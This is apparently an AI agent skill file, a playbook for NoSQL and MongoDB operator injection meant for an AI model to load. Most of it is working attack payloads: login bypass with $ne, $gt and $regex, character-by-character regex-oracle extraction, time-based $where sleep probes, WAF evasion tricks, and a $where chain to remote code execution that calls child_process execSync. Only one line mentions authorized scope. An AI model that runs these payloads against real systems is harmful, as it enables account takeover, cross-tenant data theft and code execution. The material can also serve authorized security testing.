---
name: nosql-injection
description: >-
  NoSQL injection / MongoDB operator injection attack playbook. Use when
  parameters or JSON bodies may reach MongoDB, CouchDB, Elasticsearch-style
  query DSL, JSON query filters, $where JavaScript, GraphQL-to-NoSQL resolvers,
  Redis, or when user input flows into a NoSQL query builder. Covers operator
  injection ($ne/$gt/$regex/$where), blind NoSQL injection, type confusion,
  array/key manipulation, authentication bypass, and WAF/filter evasion.
---

# SKILL: NoSQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: NoSQL injection differs from SQLi — no SQL grammar, no UNION. The core bug is **passing objects/operators where the app expects scalars**. Confirm with **differential evidence** (baseline vs mutated), never single-shot.

## 0. QUICK START

### First-pass probe set (send as JSON body or URL-encoded)

| Situation | Payload | Expected signal |
|---|---|---|
| Login (string field) | `{"username":{"$ne":""},"password":{"$ne":""}}` | Authenticated with no valid creds → vulnerable |
| Login (password only) | `{"password":{"$ne":""}}` | Same |
| Search/ID (numeric) | `{"id":{"$gt":0}}` or `{"id":{"$ne":1}}` | Returns extra rows |
| Regex filter | `{"name":{"$regex":".*"}}` | Matches everything |
| Boolean auth | `{"$where":"this.password.length>0"}` | JS eval surface |
| Type confusion | send `"1"` as `{"id":1}` vs `{"id":[1]}` | Different results = coercion |

**Confirmed = differential**: mutated request returns **different** status/count/body than baseline, and the difference is explainable only by the operator being interpreted.

---

## 1. DETECTION — WHERE NoSQL INJECTION HIDES

NoSQLi is usually found by **behavioral differences**, not errors:

| Surface | How to probe |
|---|---|
| Login / password reset | Send `$ne` object in username field |
| Search / filter / sort | Send `$regex`, `$gt`, `$lt` in query param |
| Tenant / org filters | Send `$ne` in tenant_id — cross-tenant read |
| Price / quantity / coupon | Send object type — manipulation |
| Admin list APIs | Send `$ne` to bypass ownership filter |
| GraphQL resolvers | Mutation args → NoSQL query builder |
| **Headers** | X-Forwarded-For, User-Agent, Cookie → session lookup |

**Key difference from SQLi**: the payload is often **valid JSON structure**, not a string. If the endpoint rejects malformed JSON but accepts `{"field":{"$ne":""}}`, that's the signal.

---

## 2. OPERATOR INJECTION — THE CORE BUG

Attackers inject **MongoDB query operators** into fields the app treats as scalars:

### Authentication bypass
```json
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$exists": true}, "password": {"$exists": true}}
```

### Data extraction / filter bypass
```json
{"id": {"$ne": 1}}                 // everything except id=1
{"id": {"$gt": 0}}                 // all positive ids
{"email": {"$regex": ".*@.*"}}     // match pattern
{"price": {"$lt": 100}}            // pricing abuse
{"role": {"$ne": "admin"}}         // non-admin users
{"userId": {"$in": [1,2,3]}}       // enumerated set
```

### `$where` — JavaScript evaluation (highest impact)
```json
{"$where": "this.password.length > 0"}
{"$where": "sleep(5000)"}
{"$where": "this.username == 'admin' && this.role == 'admin'"}
```

---

## 3. BLIND NoSQL INJECTION

When no data is reflected, use **response-differential inference**:

### Boolean-based (true/false response differ)
```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}   // true if username starts with 'a'
{"username": {"$regex": "^b"}, "password": {"$ne": ""}}   // false branch
```

### Regex oracle — character-by-character extraction
```
$regex ^p   → true
$regex ^pa  → true
$regex ^pb  → false  → next char is 'a'
...iterate charset per position...
```
Combine with `$regex` and a charset to extract field values without reflection.

### Time-based (response delay)
```json
{"username": {"$where": "sleep(5000)"}}
{"$where": "this.email.match(/a/) && sleep(5000)"}
```

---

## 4. TYPE CONFUSION & ARRAY COERCION

App expects `{"id": 1}` but accepts alternative types:

| Trick | Effect |
|---|---|
| `{"id": [1, 2]}` | `$in` semantics — match multiple |
| `{"id": {"$gt": 0}}` | operator object in numeric field |
| `{"active": 1}` vs `{"active": "1"}` | string/number coercion bypass |
| `{"field": null}` | bypass null-check logic |
| `{"field": {"$exists": false}}` | match docs where field absent |
| Duplicate keys `{"a":1,"a":{"$ne":""}}` | parser takes last value |

---

## 5. FILTER / WAF EVASION

When `$` is stripped or `$ne` is blocked:

| Blocked | Bypass |
|---|---|
| `$` in key | URL-encode `%24ne`; double-encode `%2524ne`; use `{"$gt": ""}` alternatives |
| `$where` keyword | `{"$whe\u0072e": ...}` unicode escape; `{"$WHeRE": ...}` case variation |
| Operator keys filtered | Use `{"query": {"$ne": ""}}` nesting; array form `[{"$ne":""}]` |
| JSON rejected on GET | Switch to POST with `Content-Type: application/json`; or send as `field[$ne]=` form syntax |
| Regex blocked | Use `$gt`/`$lt` range chaining instead |
| WAF on `$` | Percent-encode keys, use `\u0024` prefix, or split key/value |

**Form-style operator injection** (when body is `application/x-www-form-urlencoded`):
```
username[$ne]=x&password[$ne]=x
search[$regex]=^admin&sort=id
```

---

## 6. HIGH-VALUE TARGETS & IMPACT ESCALATION

- **Login** → auth bypass (P0): `$ne` in username+password
- **Tenant filter** → horizontal access to other tenants' data
- **Search/export** → dump via `$regex` OR-chain: `{"$or":[{"name":{"$regex":".*"}},{"name":{"$ne":""}}]}`
- **Password reset** → `$ne` token field → take over arbitrary account
- **Admin API** → `$ne` in role/orgId filter → vertical escalation
- **`$where` RCE** → if app runs MongoDB with `--enableJavaScriptExecution` (legacy), `$where` can reach `this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')` — verify side effects only in authorized scope.

**Impact rule**: `$ne`/`$gt` proving cross-object access = real finding. A `200` with no data change = info/low exposure at most.

---

## 7. DECISION TREE

```
                JSON/param flows into NoSQL query?
                          |
            NO -----------+----------- YES
            |                            |
    Not NoSQLi (see SQLi/        Can you send an OBJECT
    GraphQL/other routers)       where scalar expected?
                                         |
                     NO -----------------+----------------- YES
                     |                                       |
             Test string-based                  Does response differ
             injection ($where,                 from baseline?
             JS eval sinks)                              |
                                  NO -------------+------------ YES
                                  |                          |
                          Try regex oracle /         Operator executed →
                          time-based blind           confirm type (MongoDB/
                                                     ES DSL/Redis) → extract
                                                     or escalate
```

---

## 8. TESTING CHECKLIST

- [ ] Probe login with `$ne` in both username and password
- [ ] Probe search/filter params with `$gt`/`$regex`/`$lt`
- [ ] Test tenant/org filter with `$ne` for cross-tenant read
- [ ] Test price/quantity/coupon with object type for manipulation
- [ ] Send `$where` where app accepts any JSON (JS eval test)
- [ ] Try form-style `field[$ne]=` when JSON is not accepted
- [ ] Blind: regex `^a` vs `^b` differential; then char-by-char extraction
- [ ] Time-based `sleep(5000)` if no output difference
- [ ] Verify false-positive: mutated vs baseline must differ on 2+ indicators
- [ ] Record: auth bypass/cross-tenant read = medium+ with differential proof

## Related Routing

- SQL grammar / UNION / boolean-blind SQLi → [sqli-sql-injection](../sqli-sql-injection/SKILL.md)
- Object ownership / tenant boundaries → [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md)
- GraphQL query surface → [graphql-and-hidden-parameters](../graphql-and-hidden-parameters/SKILL.md)
- Type confusion affecting price/quantity/workflow → [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md)
- Burp history replay / response diff → [burp-mcp-vuln-check](../burp-mcp-vuln-check/SKILL.md)
